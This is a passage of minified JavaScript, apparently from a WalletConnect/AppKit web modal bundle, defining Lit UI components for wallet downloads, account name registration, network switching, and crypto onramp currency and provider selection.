    `:null}onChromeStore(){this.wallet?.chrome_store&&ke.openHref(this.wallet.chrome_store,"_blank")}onAppStore(){this.wallet?.app_store&&ke.openHref(this.wallet.app_store,"_blank")}onPlayStore(){this.wallet?.play_store&&ke.openHref(this.wallet.play_store,"_blank")}onHomePage(){this.wallet?.homepage&&ke.openHref(this.wallet.homepage,"_blank")}};Hq=zOe([me("w3m-downloads-view")],Hq);var WOe=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const HOe="https://walletconnect.com/explorer";let Vq=class extends he{render(){return F`
      <wui-flex flexDirection="column" .padding=${["0","s","s","s"]} gap="xs">
        ${this.recommendedWalletsTemplate()}
        <wui-list-wallet
          name="Explore all"
          showAllWallets
          walletIcon="allWallets"
          icon="externalLink"
          @click=${()=>{ke.openHref("https://walletconnect.com/explorer?type=wallet","_blank")}}
        ></wui-list-wallet>
      </wui-flex>
    `}recommendedWalletsTemplate(){const{recommended:e,featured:t}=Ft.state,{customWallets:i}=Ne.state;return[...t,...i??[],...e].slice(0,4).map(s=>F`
        <wui-list-wallet
          name=${s.name??"Unknown"}
          tagVariant="main"
          imageSrc=${ye(Nr.getWalletImage(s))}
          @click=${()=>{ke.openHref(s.homepage??HOe,"_blank")}}
        ></wui-list-wallet>
      `)}};Vq=WOe([me("w3m-get-wallet-view")],Vq);const VOe=ge`
  wui-flex {
    width: 100%;
  }

  .suggestion {
    background: var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-xs);
  }

  .suggestion:hover {
    background-color: var(--wui-color-gray-glass-005);
    cursor: pointer;
  }

  .suggested-name {
    max-width: 75%;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
  }

  form {
    width: 100%;
  }

  wui-icon-link {
    position: absolute;
    right: 20px;
    transform: translateY(11px);
  }
`;var $p=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let qd=class extends he{constructor(){super(),this.formRef=gc(),this.usubscribe=[],this.name="",this.error="",this.loading=id.state.loading,this.suggestions=id.state.suggestions,this.registered=!1,this.profileName=Se.state.profileName,this.onDebouncedNameInputChange=ke.debounce(e=>{id.validateName(e)?(this.error="",this.name=e,id.getSuggestions(e),id.isNameRegistered(e).then(t=>{this.registered=t})):e.length<4?this.error="Name must be at least 4 characters long":this.error="Can only contain letters, numbers and - characters"}),this.usubscribe.push(id.subscribe(e=>{this.suggestions=e.suggestions,this.loading=e.loading}),Se.subscribeKey("profileName",e=>{this.profileName=e,e&&(this.error="You already own a name")}))}firstUpdated(){this.formRef.value?.addEventListener("keydown",this.onEnterKey.bind(this))}disconnectedCallback(){super.disconnectedCallback(),this.usubscribe.forEach(e=>e()),this.formRef.value?.removeEventListener("keydown",this.onEnterKey.bind(this))}render(){return F`
      <wui-flex
        flexDirection="column"
        alignItems="center"
        gap="m"
        .padding=${["0","s","m","s"]}
      >
        <form ${mc(this.formRef)} @submit=${this.onSubmitName.bind(this)}>
          <wui-ens-input
            @inputChange=${this.onNameInputChange.bind(this)}
            .errorMessage=${this.error}
            .value=${this.name}
          >
          </wui-ens-input>
          ${this.submitButtonTemplate()}
          <input type="submit" hidden />
        </form>
        ${this.templateSuggestions()}
      </wui-flex>
    `}submitButtonTemplate(){return this.isAllowedToSubmit()?F`
          <wui-icon-link
            size="sm"
            icon="chevronRight"
            iconcolor="accent-100"
            @click=${this.onSubmitName.bind(this)}
          >
          </wui-icon-link>
        `:null}onSelectSuggestion(e){return()=>{this.name=e,this.registered=!1,this.requestUpdate()}}onNameInputChange(e){this.onDebouncedNameInputChange(e.detail)}nameSuggestionTagTemplate(){return this.loading?F`<wui-loading-spinner size="lg" color="fg-100"></wui-loading-spinner>`:this.registered?F`<wui-tag variant="shade" size="lg">Registered</wui-tag>`:F`<wui-tag variant="success" size="lg">Available</wui-tag>`}templateSuggestions(){if(!this.name||this.name.length<4||this.error)return null;const e=this.registered?this.suggestions.filter(t=>t.name!==this.name):[];return F`<wui-flex flexDirection="column" gap="xxs" alignItems="center">
      <wui-flex
        data-testid="account-name-suggestion"
        .padding=${["m","m","m","m"]}
        justifyContent="space-between"
        class="suggestion"
        @click=${this.onSubmitName.bind(this)}
      >
        <wui-text color="fg-100" variant="paragraph-400" class="suggested-name">
          ${this.name}</wui-text
        >${this.nameSuggestionTagTemplate()}
      </wui-flex>
      ${e.map(t=>this.availableNameTemplate(t.name))}
    </wui-flex>`}availableNameTemplate(e){return F` <wui-flex
      data-testid="account-name-suggestion"
      .padding=${["m","m","m","m"]}
      justifyContent="space-between"
      class="suggestion"
      @click=${this.onSelectSuggestion(e)}
    >
      <wui-text color="fg-100" variant="paragraph-400" class="suggested-name">
        ${e}
      </wui-text>
      <wui-tag variant="success" size="lg">Available</wui-tag>
    </wui-flex>`}isAllowedToSubmit(){return!this.loading&&!this.registered&&!this.error&&!this.profileName&&id.validateName(this.name)}async onSubmitName(){try{if(!this.isAllowedToSubmit())return;const e=`${this.name}${Me.WC_NAME_SUFFIX}`;Ve.sendEvent({type:"track",event:"REGISTER_NAME_INITIATED",properties:{isSmartAccount:Se.state.preferredAccountType===vr.ACCOUNT_TYPES.SMART_ACCOUNT,ensName:e}}),await id.registerName(e),Ve.sendEvent({type:"track",event:"REGISTER_NAME_SUCCESS",properties:{isSmartAccount:Se.state.preferredAccountType===vr.ACCOUNT_TYPES.SMART_ACCOUNT,ensName:e}})}catch(e){vt.showError(e.message),Ve.sendEvent({type:"track",event:"REGISTER_NAME_ERROR",properties:{isSmartAccount:Se.state.preferredAccountType===vr.ACCOUNT_TYPES.SMART_ACCOUNT,ensName:`${this.name}${Me.WC_NAME_SUFFIX}`,error:e?.message||"Unknown error"}})}}onEnterKey(e){e.key==="Enter"&&this.isAllowedToSubmit()&&this.onSubmitName()}};qd.styles=VOe;$p([V()],qd.prototype,"errorMessage",void 0);$p([te()],qd.prototype,"name",void 0);$p([te()],qd.prototype,"error",void 0);$p([te()],qd.prototype,"loading",void 0);$p([te()],qd.prototype,"suggestions",void 0);$p([te()],qd.prototype,"registered",void 0);$p([te()],qd.prototype,"profileName",void 0);qd=$p([me("w3m-register-account-name-view")],qd);const KOe=ge`
  .continue-button-container {
    width: 100%;
  }
`;var GOe=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Wk=class extends he{render(){return F`
      <wui-flex
        flexDirection="column"
        alignItems="center"
        gap="xxl"
        .padding=${["0","0","l","0"]}
      >
        ${this.onboardingTemplate()} ${this.buttonsTemplate()}
        <wui-link
          @click=${()=>{ke.openHref(TJ.URLS.FAQ,"_blank")}}
        >
          Learn more
          <wui-icon color="inherit" slot="iconRight" name="externalLink"></wui-icon>
        </wui-link>
      </wui-flex>
    `}onboardingTemplate(){return F` <wui-flex
      flexDirection="column"
      gap="xxl"
      alignItems="center"
      .padding=${["0","xxl","0","xxl"]}
    >
      <wui-flex gap="s" alignItems="center" justifyContent="center">
        <wui-icon-box
          size="xl"
          iconcolor="success-100"
          backgroundcolor="success-100"
          icon="checkmark"
          background="opaque"
        ></wui-icon-box>
      </wui-flex>
      <wui-flex flexDirection="column" alignItems="center" gap="s">
        <wui-text align="center" variant="medium-600" color="fg-100">
          Account name chosen successfully
        </wui-text>
        <wui-text align="center" variant="paragraph-400" color="fg-100">
          You can now fund your account and trade crypto
        </wui-text>
      </wui-flex>
    </wui-flex>`}buttonsTemplate(){return F`<wui-flex
      .padding=${["0","2l","0","2l"]}
      gap="s"
      class="continue-button-container"
    >
      <wui-button fullWidth size="lg" borderRadius="xs" @click=${this.redirectToAccount.bind(this)}
        >Let's Go!
      </wui-button>
    </wui-flex>`}redirectToAccount(){Ee.replace("Account")}};Wk.styles=KOe;Wk=GOe([me("w3m-register-account-name-success-view")],Wk);const ZOe=ge`
  @keyframes shake {
    0% {
      transform: translateX(0);
    }
    25% {
      transform: translateX(3px);
    }
    50% {
      transform: translateX(-3px);
    }
    75% {
      transform: translateX(3px);
    }
    100% {
      transform: translateX(0);
    }
  }

  wui-flex:first-child:not(:only-child) {
    position: relative;
  }

  wui-loading-hexagon {
    position: absolute;
  }

  wui-icon-box {
    position: absolute;
    right: 4px;
    bottom: 0;
    opacity: 0;
    transform: scale(0.5);
    z-index: 1;
  }

  wui-button {
    display: none;
  }

  [data-error='true'] wui-icon-box {
    opacity: 1;
    transform: scale(1);
  }

  [data-error='true'] > wui-flex:first-child {
    animation: shake 250ms cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
  }

  wui-button[data-retry='true'] {
    display: block;
    opacity: 1;
  }
`;var JR=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let uy=class extends he{constructor(){super(),this.network=Ee.state.data?.network,this.unsubscribe=[],this.showRetry=!1,this.error=!1}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}firstUpdated(){this.onSwitchNetwork()}render(){if(!this.network)throw new Error("w3m-network-switch-view: No network provided");this.onShowRetry();const e=this.getLabel(),t=this.getSubLabel();return F`
      <wui-flex
        data-error=${this.error}
        flexDirection="column"
        alignItems="center"
        .padding=${["3xl","xl","3xl","xl"]}
        gap="xl"
      >
        <wui-flex justifyContent="center" alignItems="center">
          <wui-network-image
            size="lg"
            imageSrc=${ye(Nr.getNetworkImage(this.network))}
          ></wui-network-image>

          ${this.error?null:F`<wui-loading-hexagon></wui-loading-hexagon>`}

          <wui-icon-box
            backgroundColor="error-100"
            background="opaque"
            iconColor="error-100"
            icon="close"
            size="sm"
            ?border=${!0}
            borderColor="wui-color-bg-125"
          ></wui-icon-box>
        </wui-flex>

        <wui-flex flexDirection="column" alignItems="center" gap="xs">
          <wui-text align="center" variant="paragraph-500" color="fg-100">${e}</wui-text>
          <wui-text align="center" variant="small-500" color="fg-200">${t}</wui-text>
        </wui-flex>

        <wui-button
          data-retry=${this.showRetry}
          variant="accent"
          size="md"
          .disabled=${!this.error}
          @click=${this.onSwitchNetwork.bind(this)}
        >
          <wui-icon color="inherit" slot="iconLeft" name="refresh"></wui-icon>
          Try again
        </wui-button>
      </wui-flex>
    `}getSubLabel(){const e=re.state.activeChain,t=He.getConnectedConnectorId(e);return Xe.getAuthConnector()&&t===Me.CONNECTOR_ID.AUTH?"":this.error?"Switch can be declined if chain is not supported by a wallet or previous request is still active":"Accept connection request in your wallet"}getLabel(){const e=re.state.activeChain,t=He.getConnectedConnectorId(e);return Xe.getAuthConnector()&&t===Me.CONNECTOR_ID.AUTH?`Switching to ${this.network?.name??"Unknown"} network...`:this.error?"Switch declined":"Approve in wallet"}onShowRetry(){this.error&&!this.showRetry&&(this.showRetry=!0,this.shadowRoot?.querySelector("wui-button")?.animate([{opacity:0},{opacity:1}],{fill:"forwards",easing:"ease"}))}async onSwitchNetwork(){try{this.error=!1,this.network&&await re.switchActiveNetwork(this.network)}catch{this.error=!0}}};uy.styles=ZOe;JR([te()],uy.prototype,"showRetry",void 0);JR([te()],uy.prototype,"error",void 0);uy=JR([me("w3m-network-switch-view")],uy);const YOe=ge`
  .container {
    max-height: 360px;
    overflow: auto;
  }

  .container::-webkit-scrollbar {
    display: none;
  }
`;var T4=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let pg=class extends he{constructor(){super(),this.unsubscribe=[],this.network=re.state.activeCaipNetwork,this.requestedCaipNetworks=re.getAllRequestedCaipNetworks(),this.search="",this.onDebouncedSearch=ke.debounce(e=>{this.search=e},100),this.unsubscribe.push(Li.subscribeNetworkImages(()=>this.requestUpdate()),re.subscribeKey("activeCaipNetwork",e=>this.network=e),re.subscribeKey("chains",()=>this.requestedCaipNetworks=re.getAllRequestedCaipNetworks()))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){return F`
      ${this.templateSearchInput()}
      <wui-flex
        class="container"
        .padding=${["0","s","s","s"]}
        flexDirection="column"
        gap="xs"
      >
        ${this.networksTemplate()}
      </wui-flex>

      <wui-separator></wui-separator>

      <wui-flex padding="s" flexDirection="column" gap="m" alignItems="center">
        <wui-text variant="small-400" color="fg-300" align="center">
          Your connected wallet may not support some of the networks available for this dApp
        </wui-text>
        <wui-link @click=${this.onNetworkHelp.bind(this)}>
          <wui-icon size="xs" color="accent-100" slot="iconLeft" name="helpCircle"></wui-icon>
          What is a network
        </wui-link>
      </wui-flex>
    `}templateSearchInput(){return F`
      <wui-flex gap="xs" .padding=${["0","s","s","s"]}>
        <wui-input-text
          @inputChange=${this.onInputChange.bind(this)}
          class="network-search-input"
          size="md"
          placeholder="Search network"
          icon="search"
        ></wui-input-text>
      </wui-flex>
    `}onInputChange(e){this.onDebouncedSearch(e.detail)}onNetworkHelp(){Ve.sendEvent({type:"track",event:"CLICK_NETWORK_HELP"}),Ee.push("WhatIsANetwork")}networksTemplate(){const e=re.getAllRequestedCaipNetworks(),t=re.getAllApprovedCaipNetworkIds(),i=ke.sortRequestedNetworks(t,e);return this.search?this.filteredNetworks=i?.filter(n=>n?.name?.toLowerCase().includes(this.search.toLowerCase())):this.filteredNetworks=i,this.filteredNetworks?.map(n=>F`
        <wui-list-network
          .selected=${this.network?.id===n.id}
          imageSrc=${ye(Nr.getNetworkImage(n))}
          type="network"
          name=${n.name??n.id}
          @click=${()=>this.onSwitchNetwork(n)}
          .disabled=${this.getNetworkDisabled(n)}
          data-testid=${`w3m-network-switch-${n.name??n.id}`}
        ></wui-list-network>
      `)}getNetworkDisabled(e){const t=e.chainNamespace,i=Se.getCaipAddress(t),n=re.getAllApprovedCaipNetworkIds(),s=re.getNetworkProp("supportsAllNetworks",t)!==!1,o=He.getConnectedConnectorId(t),a=Xe.getAuthConnector(),c=o===Me.CONNECTOR_ID.AUTH&&a;return!i||s||c?!1:!n?.includes(e.caipNetworkId)}onSwitchNetwork(e){const t=Ee.state.data;if(e.id===this.network?.id)return;const n=e.chainNamespace!==re.state.activeChain,s=Se.state.caipAddress,o=Se.getCaipAddress(e.chainNamespace),c=He.getConnectedConnectorId(re.state.activeChain)===Me.CONNECTOR_ID.AUTH,l=Me.AUTH_CONNECTOR_SUPPORTED_CHAINS.find(u=>u===e.chainNamespace);s?c&&l?Ee.push("SwitchNetwork",{...t,network:e}):c&&!l||n&&!o?Ee.push("SwitchActiveChain",{switchToChain:e.chainNamespace,navigateTo:"Connect",navigateWithReplace:!0,network:e}):Ee.push("SwitchNetwork",{...t,network:e}):Ee.push("SwitchNetwork",{...t,network:e})}};pg.styles=YOe;T4([te()],pg.prototype,"network",void 0);T4([te()],pg.prototype,"requestedCaipNetworks",void 0);T4([te()],pg.prototype,"filteredNetworks",void 0);T4([te()],pg.prototype,"search",void 0);pg=T4([me("w3m-networks-view")],pg);const JOe=ge`
  :host > wui-flex {
    height: 500px;
    overflow-y: auto;
    overflow-x: hidden;
    scrollbar-width: none;
    padding: var(--wui-spacing-m);
    box-sizing: border-box;
    display: flex;
    align-items: center;
    justify-content: flex-start;
  }

  :host > wui-flex::-webkit-scrollbar {
    display: none;
  }

  :host > wui-flex > wui-flex {
    width: 100%;
  }

  wui-transaction-list-item-loader {
    width: 100%;
  }
`;var k4=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const QOe=7;let gg=class extends he{constructor(){super(),this.unsubscribe=[],this.selectedOnRampProvider=Ai.state.selectedProvider,this.loading=!1,this.coinbaseTransactions=vs.state.coinbaseTransactions,this.tokenImages=Li.state.tokenImages,this.unsubscribe.push(Ai.subscribeKey("selectedProvider",e=>{this.selectedOnRampProvider=e}),Li.subscribeKey("tokenImages",e=>this.tokenImages=e),()=>{clearTimeout(this.refetchTimeout)},vs.subscribe(e=>{this.coinbaseTransactions={...e.coinbaseTransactions}})),vs.clearCursor(),this.fetchTransactions()}render(){return F`
      <wui-flex flexDirection="column" .padding=${["0","s","s","s"]} gap="xs">
        ${this.loading?this.templateLoading():this.templateTransactionsByYear()}
      </wui-flex>
    `}templateTransactions(e){return e?.map(t=>{const i=V9.formatDate(t?.metadata?.minedAt),n=t.transfers[0],s=n?.fungible_info;if(!s)return null;const o=s?.icon?.url||this.tokenImages?.[s.symbol||""];return F`
        <w3m-onramp-activity-item
          label="Bought"
          .completed=${t.metadata.status==="ONRAMP_TRANSACTION_STATUS_SUCCESS"}
          .inProgress=${t.metadata.status==="ONRAMP_TRANSACTION_STATUS_IN_PROGRESS"}
          .failed=${t.metadata.status==="ONRAMP_TRANSACTION_STATUS_FAILED"}
          purchaseCurrency=${ye(s.symbol)}
          purchaseValue=${n.quantity.numeric}
          date=${i}
          icon=${ye(o)}
          symbol=${ye(s.symbol)}
        ></w3m-onramp-activity-item>
      `})}templateTransactionsByYear(){return Object.keys(this.coinbaseTransactions).sort().reverse().map(t=>{const i=parseInt(t,10);return new Array(12).fill(null).map((s,o)=>o).reverse().map(s=>{const o=Of.getTransactionGroupTitle(i,s),a=this.coinbaseTransactions[i]?.[s];return a?F`
          <wui-flex flexDirection="column">
            <wui-flex
              alignItems="center"
              flexDirection="row"
              .padding=${["xs","s","s","s"]}
            >
              <wui-text variant="paragraph-500" color="fg-200">${o}</wui-text>
            </wui-flex>
            <wui-flex flexDirection="column" gap="xs">
              ${this.templateTransactions(a)}
            </wui-flex>
          </wui-flex>
        `:null})})}async fetchTransactions(){await this.fetchCoinbaseTransactions()}async fetchCoinbaseTransactions(){const e=Se.state.address,t=Ne.state.projectId;if(!e)throw new Error("No address found");if(!t)throw new Error("No projectId found");this.loading=!0,await vs.fetchTransactions(e,"coinbase"),this.loading=!1,this.refetchLoadingTransactions()}refetchLoadingTransactions(){const e=new Date;if((this.coinbaseTransactions[e.getFullYear()]?.[e.getMonth()]||[]).filter(n=>n.metadata.status==="ONRAMP_TRANSACTION_STATUS_IN_PROGRESS").length===0){clearTimeout(this.refetchTimeout);return}this.refetchTimeout=setTimeout(async()=>{const n=Se.state.address;await vs.fetchTransactions(n,"coinbase"),this.refetchLoadingTransactions()},3e3)}templateLoading(){return Array(QOe).fill(F` <wui-transaction-list-item-loader></wui-transaction-list-item-loader> `).map(e=>e)}};gg.styles=JOe;k4([te()],gg.prototype,"selectedOnRampProvider",void 0);k4([te()],gg.prototype,"loading",void 0);k4([te()],gg.prototype,"coinbaseTransactions",void 0);k4([te()],gg.prototype,"tokenImages",void 0);gg=k4([me("w3m-onramp-activity-view")],gg);const XOe=ge`
  :host > wui-grid {
    max-height: 360px;
    overflow: auto;
  }

  wui-flex {
    transition: opacity var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: opacity;
  }

  wui-grid::-webkit-scrollbar {
    display: none;
  }

  wui-flex.disabled {
    opacity: 0.3;
    pointer-events: none;
    user-select: none;
  }
`;var N4=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let mg=class extends he{constructor(){super(),this.unsubscribe=[],this.selectedCurrency=Ai.state.paymentCurrency,this.currencies=Ai.state.paymentCurrencies,this.currencyImages=Li.state.currencyImages,this.checked=!1,this.unsubscribe.push(Ai.subscribe(e=>{this.selectedCurrency=e.paymentCurrency,this.currencies=e.paymentCurrencies}),Li.subscribeKey("currencyImages",e=>this.currencyImages=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const{termsConditionsUrl:e,privacyPolicyUrl:t}=Ne.state,i=Ne.state.features?.legalCheckbox,o=!!(e||t)&&!!i&&!this.checked;return F`
      <w3m-legal-checkbox @checkboxChange=${this.onCheckboxChange.bind(this)}></w3m-legal-checkbox>
      <wui-flex
        flexDirection="column"
        .padding=${["0","s","s","s"]}
        gap="xs"
        class=${ye(o?"disabled":void 0)}
      >
        ${this.currenciesTemplate(o)}
      </wui-flex>
      <w3m-legal-footer></w3m-legal-footer>
    `}currenciesTemplate(e=!1){return this.currencies.map(t=>F`
        <wui-list-item
          imageSrc=${ye(this.currencyImages?.[t.id])}
          @click=${()=>this.selectCurrency(t)}
          variant="image"
          tabIdx=${ye(e?-1:void 0)}
        >
          <wui-text variant="paragraph-500" color="fg-100">${t.id}</wui-text>
        </wui-list-item>
      `)}selectCurrency(e){e&&(Ai.setPaymentCurrency(e),Ut.close())}onCheckboxChange(e){this.checked=!!e.detail}};mg.styles=XOe;N4([te()],mg.prototype,"selectedCurrency",void 0);N4([te()],mg.prototype,"currencies",void 0);N4([te()],mg.prototype,"currencyImages",void 0);N4([te()],mg.prototype,"checked",void 0);mg=N4([me("w3m-onramp-fiat-select-view")],mg);var zee=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Hk=class extends he{constructor(){super(),this.unsubscribe=[],this.providers=Ai.state.providers,this.unsubscribe.push(Ai.subscribeKey("providers",e=>{this.providers=e}))}firstUpdated(){const e=this.providers.map(async t=>t.name==="coinbase"?await this.getCoinbaseOnRampURL():Promise.resolve(t?.url));Promise.all(e).then(t=>{this.providers=this.providers.map((i,n)=>({...i,url:t[n]||""}))})}render(){return F`
      <wui-flex flexDirection="column" .padding=${["0","s","s","s"]} gap="xs">
        ${this.onRampProvidersTemplate()}
      </wui-flex>
      <w3m-onramp-providers-footer></w3m-onramp-providers-footer>
    `}onRampProvidersTemplate(){return this.providers.filter(e=>e.supportedChains.includes(re.state.activeChain??"eip155")).map(e=>F`
          <w3m-onramp-provider-item
            label=${e.label}
            name=${e.name}
            feeRange=${e.feeRange}
            @click=${()=>{this.onClickProvider(e)}}
            ?disabled=${!e.url}
          ></w3m-onramp-provider-item>
        `)}onClickProvider(e){Ai.setSelectedProvider(e),Ee.push("BuyInProgress"),ke.openHref(e.url,"popupWindow","width=600,height=800,scrollbars=yes"),Ve.sendEvent({type:"track",event:"SELECT_BUY_PROVIDER",properties:{provider:e.name,isSmartAccount:Se.state.preferredAccountType===vr.ACCOUNT_TYPES.SMART_ACCOUNT}})}async getCoinbaseOnRampURL(){const e=Se.state.address,t=re.state.activeCaipNetwork;if(!e)throw new Error("No address found");if(!t?.name)throw new Error("No network found");const i=kr.WC_COINBASE_PAY_SDK_CHAIN_NAME_MAP[t.name]??kr.WC_COINBASE_PAY_SDK_FALLBACK_CHAIN,n=Ai.state.purchaseCurrency,s=n?[n.symbol]:Ai.state.purchaseCurrencies.map(o=>o.symbol);return await Lt.generateOnRampURL({defaultNetwork:i,destinationWallets:[{address:e,blockchains:kr.WC_COINBASE_PAY_SDK_CHAINS,assets:s}],partnerUserId:e,purchaseAmount:Ai.state.purchaseAmount})}};zee([te()],Hk.prototype,"providers",void 0);Hk=zee([me("w3m-onramp-providers-view")],Hk);const eBe=ge`
  :host > wui-grid {
    max-height: 360px;
    overflow: auto;
  }

  wui-flex {
    transition: opacity var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: opacity;
  }

  wui-grid::-webkit-scrollbar {
    display: none;
  }

  wui-flex.disabled {
    opacity: 0.3;
    pointer-events: none;
    user-select: none;
  }
`;var P4=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let wg=class extends he{constructor(){super(),this.unsubscribe=[],this.selectedCurrency=Ai.state.purchaseCurrencies,this.tokens=Ai.state.purchaseCurrencies,this.tokenImages=Li.state.tokenImages,this.checked=!1,this.unsubscribe.push(Ai.subscribe(e=>{this.selectedCurrency=e.purchaseCurrencies,this.tokens=e.purchaseCurrencies}),Li.subscribeKey("tokenImages",e=>this.tokenImages=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const{termsConditionsUrl:e,privacyPolicyUrl:t}=Ne.state,i=Ne.state.features?.legalCheckbox,o=!!(e||t)&&!!i&&!this.checked;return F`
      <w3m-legal-checkbox @checkboxChange=${this.onCheckboxChange.bind(this)}></w3m-legal-checkbox>
      <wui-flex
        flexDirection="column"
        .padding=${["0","s","s","s"]}
        gap="xs"
        class=${ye(o?"disabled":void 0)}
      >
        ${this.currenciesTemplate(o)}
      </wui-flex>
      <w3m-legal-footer></w3m-legal-footer>
    `}currenciesTemplate(e=!1){return this.tokens.map(t=>F`
        <wui-list-item
          imageSrc=${ye(this.tokenImages?.[t.symbol])}
          @click=${()=>this.selectToken(t)}
          variant="image"
          tabIdx=${ye(e?-1:void 0)}
        >
          <wui-flex gap="3xs" alignItems="center">
            <wui-text variant="paragraph-500" color="fg-100">${t.name}</wui-text>
            <wui-text variant="small-400" color="fg-200">${t.symbol}</wui-text>
          </wui-flex>
        </wui-list-item>
      `)}selectToken(e){e&&(Ai.setPurchaseCurrency(e),Ut.close())}onCheckboxChange(e){this.checked=!!e.detail}};wg.styles=eBe;P4([te()],wg.prototype,"selectedCurrency",void 0);P4([te()],wg.prototype,"tokens",void 0);P4([te()],wg.prototype,"tokenImages",void 0);P4([te()],wg.prototype,"checked",void 0);wg=P4([me("w3m-onramp-token-select-view")],wg);const tBe=ge`
  :host > wui-flex:first-child {
    overflow-y: auto;
    overflow-x: hidden;
    scrollbar-width: none;
  }

  :host > wui-flex:first-child::-webkit-scrollbar {
    display: none;
  }

  wui-loading-hexagon {
    position: absolute;
  }

  .action-button {
    width: 100%;
    border-radius: var(--wui-border-radius-xs);
  }

  .action-button:disabled {
    border-color: 1px solid var(--wui-color-gray-glass-005);
  }

  .swap-inputs-container {
    position: relative;
  }

  .replace-tokens-button-container {
    display: flex;
    justify-content: center;
    align-items: center;
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    gap: var(--wui-spacing-1xs);
    border-radius: var(--wui-border-radius-xs);
    background-color: var(--wui-color-modal-bg-base);
    padding: var(--wui-spacing-xxs);
  }

  .replace-tokens-button-container > button {
    display: flex;
    justify-content: center;
    align-items: center;
    height: 40px;
    width: 40px;
    padding: var(--wui-spacing-xs);
    border: none;
    border-radius: var(--wui-border-radius-xxs);
    background: var(--wui-color-gray-glass-002);
    transition: background-color var(--wui-duration-md) var(--wui-ease-out-power-1);
    will-change: background-color;
    z-index: 20;
  }

  .replace-tokens-button-container > button:hover {
    background: var(--wui-color-gray-glass-005);
  }

  .details-container > wui-flex {
    background: var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-xxs);
    width: 100%;
  }

  .details-container > wui-flex > button {
    border: none;
    background: none;
    padding: var(--wui-spacing-s);
    border-radius: var(--wui-border-radius-xxs);
    transition: background 0.2s linear;
  }

  .details-container > wui-flex > button:hover {
    background: var(--wui-color-gray-glass-002);
  }

  .details-content-container {
    padding: var(--wui-spacing-1xs);
    display: flex;
    align-items: center;
    justify-content: center;
  }

  .details-content-container > wui-flex {
    width: 100%;
  }

  .details-row {
    width: 100%;
    padding: var(--wui-spacing-s) var(--wui-spacing-xl);
    border-radius: var(--wui-border-radius-xxs);
    background: var(--wui-color-gray-glass-002);
  }
